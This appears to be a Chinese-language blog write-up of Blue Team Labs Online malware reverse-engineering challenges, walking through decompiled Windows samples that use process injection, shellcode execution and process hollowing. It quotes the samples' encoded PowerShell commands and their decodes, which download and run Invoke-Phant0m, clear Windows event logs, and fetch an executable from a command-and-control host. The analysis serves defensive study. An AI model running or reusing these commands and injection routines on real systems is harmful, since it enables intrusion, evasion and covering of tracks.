---
title: BTLO - Reverse enginnering - Injection's writeup
published: 2025-11-28
description: "Blue Team Labs Online，Reverse Enginnering - Injection系列挑戰寫的writeup"
tags: ["Cybersec","writeup"]
category: CTF
draft: false
lang: zh_TW
---
網路上其他的都沒有很深入分析每隻惡意程式的原理，所以想分享我的分析與解題步驟
## Reverse Engineering - Another Injection
這題是用Golang寫的
![image](https://hackmd.io/_uploads/BkIRpkIZWe.png)
```cpp=
// main.main
void __fastcall main_main()
{
  int v0; // [rsp+10h] [rbp-60h]
  _746_uint8 *p__746_uint8; // [rsp+50h] [rbp-20h]
  __int64 v2[2]; // [rsp+58h] [rbp-18h] BYREF

  p__746_uint8 = (_746_uint8 *)runtime_newobject((__int64)&RTYPE__746_uint8);
  *(_QWORD *)p__746_uint8 = 0x896000000082E8FCLL;
  *(_QWORD *)&(*p__746_uint8)[8] = 0x8B30508B64C031E5LL;
  ((void (__fastcall *)(uint8 *, void *))loc_466D5C)(&(*p__746_uint8)[10], &unk_5046FA);
  v2[0] = (__int64)&RTYPE_string;
  v2[1] = (__int64)&stru_502058.gcdata;
  fmt_Fprintln((__int64)&go_itab__os_File_io_Writer, os_Stdout, (__int64)v2, 1, 1);
  while ( 1 )
  {
    main_getpid();
    if ( v0 )
      break;
    time_Sleep(1000000000);
  }
  main_inject((__int64)p__746_uint8, 746, 746, v0);
}
```

### Q1: What is the language the program is written?
> A1: golang

### Q2: What is the build id?
```ps
PS C:\Users\user\CTF\BTLO\6f581df0caadc199d2e99fff84b0534ec52ae272\sample> go tool buildid .\main.exe
```
> A2: eck19EyXq_9c975RxNJ1/QkbhfvYWoTcAeJreFwhX/q3HwQW17YdD3iMlLFCzB/1ZpNy-9ah0QEvzlOTFcq

### Q3: What is the dependency package the sample uses for invoking windows APIs 
大部分都是用Go語言內的syscall，但是看到`main_getpid`:
```cpp=
// main.getpid
int main_getpid()
{
  uint32 *p_uint32; // rax
  __int64 *v1; // rcx
  __int64 v2; // rdx
  signed __int64 v3; // rdx
  unsigned __int64 v4; // rcx
  __int128 v5; // [rsp+8h] [rbp-88h]
  int v6; // [rsp+34h] [rbp-5Ch]
  __int64 v7; // [rsp+38h] [rbp-58h]
  signed __int64 v8; // [rsp+40h] [rbp-50h]
  unsigned __int64 v9; // [rsp+48h] [rbp-48h]
  __int64 v10; // [rsp+50h] [rbp-40h]
  __int64 v11; // [rsp+58h] [rbp-38h]
  __int64 *v12; // [rsp+60h] [rbp-30h]
  __int64 v13; // [rsp+68h] [rbp-28h]
  uint32 *v14; // [rsp+70h] [rbp-20h]
  _QWORD v15[2]; // [rsp+78h] [rbp-18h] BYREF

  v15[0] = "notepad.exe";
  v15[1] = 11;
  v13 = runtime_makeslice((__int64)&RTYPE_uint32, 1000, 1000);
  p_uint32 = (uint32 *)runtime_newobject((__int64)&RTYPE_uint32);
  v14 = p_uint32;
  v1 = v15;
  v2 = 0;
  while ( 1 )
  {
    v10 = v2;
    v12 = v1;
    v11 = *v1;
    v7 = v1[1];
    if ( github_com_TheTitanrain_w32_EnumProcesses(v13, 1000, 1000, 1000, (__int64)p_uint32) )
    {
      p_uint32 = v14;
      v4 = (unsigned __int64)*v14 >> 2;
      if ( v4 > 0x3E8 )
        runtime_panicSliceAcap();
      v9 = (unsigned __int64)*v14 >> 2;
      v3 = 0;
      while ( v3 < (__int64)v4 )
      {
        v8 = v3;
        v6 = *(_DWORD *)(v13 + 4 * v3);
        v5 = main_getprocname(v6);
        if ( *((_QWORD *)&v5 + 1) == v7 && runtime_memequal(v5, v11, *((__int64 *)&v5 + 1)) )
          return v6;
        time_Sleep(15000000);
        v3 = v8 + 1;
        p_uint32 = v14;
        v4 = v9;
      }
    }
    else
    {
      p_uint32 = v14;
    }
    if ( v10 + 1 >= 1 )
      break;
    v2 = v10 + 1;
    v1 = v12 + 2;
  }
  return 0;
}
```
可以看到用了`github_com_TheTitanrain_w32_EnumProcesses`
> A3: github.com/TheTitanrain/w32

### Q4:What is the victim process? (Hint: 32bit)
要先理解這整支程式在幹嘛

在`main_getpid()`的地方，回傳notepad.exe的位址

再看到main_inject():
```cpp=
// main.inject
void __golang main_inject(uintptr a1, uintptr a2, __int64 a3, unsigned int a4)
{
  //省略型態宣告...

  DLL = syscall_LoadDLL((__int64)"kernel32.dll", 12);
  if ( v12 )
  {
    v5 = *(_QWORD *)(v12 + 8);
    goto LABEL_8;
  }
  v19 = DLL;
  Proc = syscall__ptr_DLL_FindProc(DLL, (__int64)"OpenProcess", 11);
  if ( v13 )
  {
    runtime_gopanic(*(_QWORD *)(v13 + 8));
LABEL_8:
    runtime_gopanic(v5);
  }
  v18 = Proc;
  v17 = syscall__ptr_DLL_FindProc(v19, (__int64)"VirtualAllocEx", 14);
  v16 = syscall__ptr_DLL_FindProc(v19, (__int64)"WriteProcessMemory", 18);
  v20 = syscall__ptr_DLL_FindProc(v19, (__int64)"CreateRemoteThread", 18);
  v21 = syscall__ptr_DLL_FindProc(v19, (__int64)"CloseHandle", 11);
  p__3_uintptr = (_3_uintptr *)runtime_newobject((__int64)&RTYPE__3_uintptr);
  (*p__3_uintptr)[0] = 2035711;
  (*p__3_uintptr)[1] = 0;
  (*p__3_uintptr)[2] = a4;
  v15 = syscall__ptr_Proc_Call(v18, (__int64)p__3_uintptr, 3, 3);
  p__5_uintptr = (_5_uintptr *)runtime_newobject((__int64)&RTYPE__5_uintptr);
  (*p__5_uintptr)[0] = v15;
  (*p__5_uintptr)[1] = 0;
  (*p__5_uintptr)[2] = a2;
  (*p__5_uintptr)[3] = 4096;
  (*p__5_uintptr)[4] = 64;
  v14 = syscall__ptr_Proc_Call(v17, (__int64)p__5_uintptr, 5, 5);
  if ( !a2 )
    runtime_panicIndex();
  v9 = (_5_uintptr *)runtime_newobject((__int64)&RTYPE__5_uintptr);
  (*v9)[0] = v15;
  (*v9)[1] = v14;
  (*v9)[2] = a1;
  (*v9)[3] = a2;
  (*v9)[4] = 0;
  syscall__ptr_Proc_Call(v16, (__int64)v9, 5, 5);
  p__7_uintptr = (_7_uintptr *)runtime_newobject((__int64)&_uintpt::RTYPE);
  (*p__7_uintptr)[0] = v15;
  *(_OWORD *)&(*p__7_uintptr)[1] = 0;
  (*p__7_uintptr)[3] = v14;
  *(_OWORD *)&(*p__7_uintptr)[4] = 0;
  (*p__7_uintptr)[6] = 0;
  syscall__ptr_Proc_Call(v20, (__int64)p__7_uintptr, 7, 7);
  p__1_uintptr = (_1_uintptr *)runtime_newobject((__int64)&RTYPE__1_uintptr);
  (*p__1_uintptr)[0] = v15;
  syscall__ptr_Proc_Call(v21, (__int64)p__1_uintptr, 1, 1);
}
```
先用`OpenProcess`取得剛剛getpid回傳地址的HANDLE hProcess

再用`VirtualAllocEx`配置一段記憶體，把shellcode寫進去，最後用`CreateRemoteThread`開一條thread執行shellcode

> A4: notepad.exe

### Q5: What is the process invoked from the shellcode?
翻shellcode，可以找到
```
powershell -ep bypass -W hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGgAbABsAGQAegAvAEkAbgB2AG8AawBlAC0AUABoAGEAbgB0ADAAbQAvAG0AYQBzAHQAZQByAC8ASQBuAHYAbwBrAGUALQBQAGgAYQBuAHQAMABtAC4AcABzADEAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABjAGgAYQBuAGcAZQAuAHAAcwAxACIAOwAgAEkAbQBwAG8AcgB0AC0ATQBvAGQAdQBsAGUAIABDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcAGMAaABhAG4AZwBlAC4AcABzADEAOwBJAG4AdgBvAGsAZQAtAFAAaABhAG4AdAAwAG0AOwA=
```
> A5: powershell

### Q6: What is the name of the created file?
把上面那串拿去base64 UTF-16LE decode:
```
Invoke-WebRequest "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1" -OutFile "C:\Windows\Temp\change.ps1"; Import-Module C:\Windows\Temp\change.ps1;Invoke-Phant0m;
```
> A6: C:\Windows\Temp\change.ps1

### Q7: What is the name of the actual tool executed?
> A7: Invoke-Phant0m

## Injection Series Part 3
先逆一下`main()`:
```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  HANDLE EventW; // edi
  void *v5; // esi
  struct _TP_WAIT *ThreadpoolWait; // eax
  int v8; // eax

  v3 = strcmp(argv[1], "message");
  if ( v3 )
    v3 = v3 < 0 ? -1 : 1;
  if ( v3 )
  {
    v8 = strcmp(argv[1], "killall");
    if ( v8 )
      v8 = v8 < 0 ? -1 : 1;
    if ( !v8 )
      system(
        "powershell -ep bypass -enc QwBsAGUAYQByAC0ARQB2AGUAbgB0AEwAbwBnACAALQBMAG8AZwBuAGEAbQBlACAAYQBwAHAAbABpAGMAYQB0A"
        "GkAbwBuACwAIgBXAGkAbgBkAG8AdwBzACAAUABvAHcAZQByAFMAaABlAGwAbAAiACwAcwBlAGMAdQByAGkAdAB5ACwAIgBzAHkAcwB0AGUAbQAiAA==");
    return 0;
  }
  else
  {
    EventW = CreateEventW(0, 0, 1, 0);
    v5 = VirtualAlloc(0, 0x120u, 0x1000u, 0x40u);
    memmove(v5, &unk_403018, 0x120u);
    ThreadpoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)v5, 0, 0);
    SetThreadpoolWait(ThreadpoolWait, EventW, 0);
    WaitForSingleObject(EventW, 0xFFFFFFFF);
    return 0;
  }
}
```
### Q1: How many arguments does the sample take?
`main()`只會用到`argv`
> A1: 1

### Q2: Again, what is the size of the shellcode? 😉
從第25行開始看:
```cpp=
EventW = CreateEventW(0, 0, 1, 0);    //建一個event
v5 = VirtualAlloc(0, 0x120u, 0x1000u, 0x40u);    //配置一塊記憶體
memmove(v5, &unk_403018, 0x120u);    //把&unk_403018寫進去
ThreadpoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)v5, 0, 0);    //把這段記憶體當作Thread Pool Wait Callback
SetThreadpoolWait(ThreadpoolWait, EventW, 0);    //指定這個Wait Object要監聽哪個Event
WaitForSingleObject(EventW, 0xFFFFFFFF);    //主執行緒等到永遠
```
所以那段`&unk_403018`就是shellcode，寫入長度為0x120，十進制為288
> A2: 288

### Q3: In VirtualAlloc what does the flAllocationType value represents?
參考MS Learn對`VirtualAlloc`的定義:
```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
`flAllocationType`是第三個參數，在程式中傳入值為0x1000，對應到`MEM_COMMIT`
![image](https://hackmd.io/_uploads/By7jlASZZl.png)
> A3: MEM_COMMIT

### Q4: What is the argument required by the sample to run the shellcode?
第9行
> A4: message

### Q5: What is the payload in Metasploit that would have been used to generate the shellcode?
問chatGPT
> A5: windows/messagebox

Q6: What is the API used to create a wait object?
第28行
> A6: CreateThreadpoolWait

### Q7:What is the library function used to copy shellcode between memory blocks?
第27行
> A7: memmove

### Q8: What argument to the sample invokes powershell process?
第14行
> A8: killall

### Q9: After decoding the powershell, list the log names as in the order in the script 
把powershell要執行的那段base64 UTF-16LE decode:
`Clear-EventLog -Logname application,"Windows PowerShell",security,"system"`
> A9: Application, Windows Powershell, Security, System

## Injection Series Part 4
先逆一下`main()`的地方:

```cpp=
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //省略型態宣告...
  v3 = (struct _STARTUPINFOA *)operator new(0x44u);
  memset(v3, 0, sizeof(struct _STARTUPINFOA));
  v33 = (struct _PROCESS_INFORMATION *)operator new(0x10u);
  *v33 = 0;
  v4 = operator new(0x18u);
  *(_OWORD *)v4 = 0;
  *((_QWORD *)v4 + 2) = 0;
  ReturnLength = 0;
  CreateProcessA(0, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", 0, 0, 1, 4u, 0, 0, v3, v33);
  v5 = v33->hProcess;
  hProcess = v5;
  NtQueryInformationProcess(v33->hProcess, ProcessBasicInformation, v4, 0x18u, &ReturnLength);
  v6 = v4[1];
  Buffer = 0;
  NumberOfBytesRead = 0;
  ReadProcessMemory(v5, (LPCVOID)(v6 + 8), &Buffer, 4u, &NumberOfBytesRead);
  system(
    "powershell.exe -ep bypass -windowstyle hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAd"
    "AB0AHAAOgAvAC8AcwBvAG0AZQBjADIALgBzAGUAcgB2AGUAcgAvAGUAeABwAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXABcAHcAaQBuA"
    "GQAbwB3AHMAXABcAHQAZQBtAHAAXABcAGUAeABwAC4AZQB4AGUACgA=");
  FileA = CreateFileA("C:\\windows\\temp\\exp.exe", 0x80000000, 0, 0, 4u, 0, 0);
  FileSize = GetFileSize(FileA, 0);
  ProcessHeap = GetProcessHeap();
  lpBuffer = HeapAlloc(ProcessHeap, 8u, FileSize);
  ReadFile(FileA, lpBuffer, FileSize, 0, 0);
  v10 = lpBuffer;
  v43 = (char *)lpBuffer + lpBuffer[15];
  v11 = *((_DWORD *)v43 + 20);
  ModuleHandleA = GetModuleHandleA("ntdll");
  NtUnmapViewOfSection = (NTSTATUS (__stdcall *)(HANDLE, PVOID))GetProcAddress(ModuleHandleA, "NtUnmapViewOfSection");
  NtUnmapViewOfSection(v5, Buffer);
  v14 = (char *)VirtualAllocEx(v5, Buffer, v11, 0x3000u, 0x40u);
  Buffer = v14;
  v31 = *((_DWORD *)v43 + 21);
  v38 = &v14[-*((_DWORD *)v43 + 13)];
  *((_DWORD *)v43 + 13) = v14;
  WriteProcessMemory(v5, v14, lpBuffer, v31, 0);
  v41 = (char *)v10 + v10[15] + 248;
  GetLastError();
  v47 = 0;
  v15 = *((_WORD *)v43 + 3);
  if ( v15 )
  {
    v16 = v41 + 20;
    do
    {
      WriteProcessMemory(v5, &Buffer[*(v16 - 2)], (char *)lpBuffer + *v16, *(v16 - 1), 0);
      v16 += 10;
      ++v47;
    }
    while ( v47 < *((unsigned __int16 *)v43 + 3) );
    v10 = lpBuffer;
    v15 = *((_WORD *)v43 + 3);
  }
  v17 = 0;
  v39 = 0;
  v18 = *((_DWORD *)v43 + 41);
  v34 = v18;
  if ( v15 )
  {
    v19 = v41;
    do
    {
      if ( *(_DWORD *)v19 == 1818587694 && v19[4] == 111 )
      {
        v20 = *((_DWORD *)v19 + 5);
        v21 = 0;
        v32 = v20;
        if ( v18 )
        {
          do
          {
            v22 = v21 + v20;
            v21 += 8;
            v23 = (_DWORD *)((char *)v10 + v22);
            v24 = (char *)v10 + v21 + v20;
            v37 = v23;
            v25 = 0;
            v36 = v24;
            v26 = (unsigned int)(v23[1] - 8) >> 1;
            if ( v26 )
            {
              v35 = v21 + 2 * v26;
              do
              {
                v27 = *(_WORD *)&v24[2 * v25];
                if ( v27 >= 0x1000u )
                {
                  v47 = 0;
                  v28 = *v23 + (v27 & 0xFFF);
                  ReadProcessMemory(hProcess, &Buffer[v28], &v47, 4u, &NumberOfBytesRead);
                  v47 += (int)v38;
                  WriteProcessMemory(hProcess, &Buffer[v28], &v47, 4u, 0);
                  GetLastError();
                  v23 = v37;
                  v24 = v36;
                }
                ++v25;
              }
              while ( v25 < v26 );
              v21 = v35;
            }
            v18 = v34;
            v20 = v32;
            v10 = lpBuffer;
          }
          while ( v21 < v34 );
          v19 = v41;
          v17 = v39;
        }
      }
      else
      {
        v19 += 40;
        v41 = v19;
      }
      ++v17;
      v10 = lpBuffer;
      v39 = v17;
    }
    while ( v17 < *((unsigned __int16 *)v43 + 3) );
  }
  v29 = (CONTEXT *)operator new(0x2CCu);
  memset(&v29->Dr0, 0, 0x2C8u);
  v29->ContextFlags = 65538;
  GetThreadContext(v33->hThread, v29);
  v29->Eax = (DWORD)&Buffer[*((_DWORD *)v43 + 10)];
  SetThreadContext(v33->hThread, v29);
  ResumeThread(v33->hThread);
  return 0;
}
```
### Q1: What is the process that would be first spawned by the sample? And what is the API used?

在第12行:
```cpp
CreateProcessA(0, (LPSTR)"c:\\windows\\syswow64\\notepad.exe", 0, 0, 1, 4u, 0, 0, v3, v33);
```

> A1: notepad.exe,CreateProcessA

### Q2: The value 4 has been pushed as a parameter to this API, what does that denote?

同上題，`CreateProcessA`在第6個參數傳入`4u`，可以去MS learn看他的API document:
```cpp
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```
可以看到第6個參數名稱是`dwCreationFlags`，再去看看對他的定義:
![image](https://hackmd.io/_uploads/r1S3qIHZbe.png)
> A2: CREATE_SUSPENDED

### Q3: What is the domain that the malware tries to connect? 
找回第21行:
```cpp
  system(
    "powershell.exe -ep bypass -windowstyle hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAd"
    "AB0AHAAOgAvAC8AcwBvAG0AZQBjADIALgBzAGUAcgB2AGUAcgAvAGUAeABwAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXABcAHcAaQBuA"
    "GQAbwB3AHMAXABcAHQAZQBtAHAAXABcAGUAeABwAC4AZQB4AGUACgA=");
```
把那串用base64 UTF-16LE decode:
`Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\\windows\\temp\\exp.exe`
> A3: somec2.server

### Q4: What is the cmdlet used to download the file and what is the path of the file stored?
同上題的地方
> A4: Invoke-WebRequest,c:\\windows\\temp\\exp.exe

### Q5: Just after the file download instructions, a function from ntdll has been loaded and invoked by the sample. What is the function name?
看到第32 ~ 34行:
```cpp
ModuleHandleA = GetModuleHandleA("ntdll");
NtUnmapViewOfSection = (NTSTATUS (__stdcall *)(HANDLE, PVOID))GetProcAddress(ModuleHandleA, "NtUnmapViewOfSection");
NtUnmapViewOfSection(v5, Buffer);
```
`GetModuleHandleA()`找出`ntdll.dll`的位置，再用`GetProcAddress()`從裡面找出`NtUnmapViewOfSection()`的位置然後轉型調用
> A5: NtUnmapViewOfSection

### Q6: After the allocation of memory and writing the date into the allocated memory. What are the 2 APIs used to update the entry point and resume the thread? 

首先要先理解這支惡意程式大致上的原理:
1. 先開一個notepad.exe
2. 從C2下載`exp.exe`，整個讀進`lpBuffer`
3. 用`NtUnmapViewOfSection()`把原本`notepad.exe`的映像unmap掉，把`exp.exe`配置進去
4. 把eax設定成新的entrypoint繼續跑

第4項就是題目在問的，可以看到第126行
> A6: SetThreadContext,ResumeThread

### Q7: What is the MITRE ID for this technique implemented in this sample?
我跑去問chatGPT，哈哈
![image](https://hackmd.io/_uploads/S14tiTSb-x.png)

> A7: T1055.012

